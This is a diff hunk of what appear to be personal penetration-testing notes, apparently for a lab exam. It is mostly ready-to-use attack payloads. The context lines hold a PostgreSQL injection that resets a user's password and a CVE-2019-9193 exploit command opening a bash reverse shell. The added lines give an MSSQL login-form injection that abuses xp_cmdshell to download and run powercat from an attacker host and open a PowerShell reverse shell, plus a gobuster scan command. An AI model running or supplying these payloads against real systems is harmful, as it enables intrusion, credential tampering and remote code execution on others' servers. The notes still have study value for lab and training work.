@@ -715,6 +715,18 @@ weight=12&height='; alter user rubben with password 'password' -- //&email=a%40a
 python3 cve-2019-9193.py -i 192.168.198.49 -d glovedb -U rubben -P password -c bash -c "bash -i >& /dev/tcp/192.168.45.202/4444 0>&1"
 ```
 
+
+For windows IIS servers, we need to use gobuster with aspx extension and word list.  also disable errors
+
+reverse shell sqli for MSQL
+__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox='
+;EXEC master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.202/powercat.ps1\");powercat -c 192.168.45.202 -p 4444 -e powershell"';--+//&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test&ctl00%24ContentPlaceHolder1%24LoginButton=Login
+
+
+```
+gobuster dir -u http://192.168.198.50 -x aspx -w aspx.txt --no-error
+```
+
 ## Client-side attacks
 
 
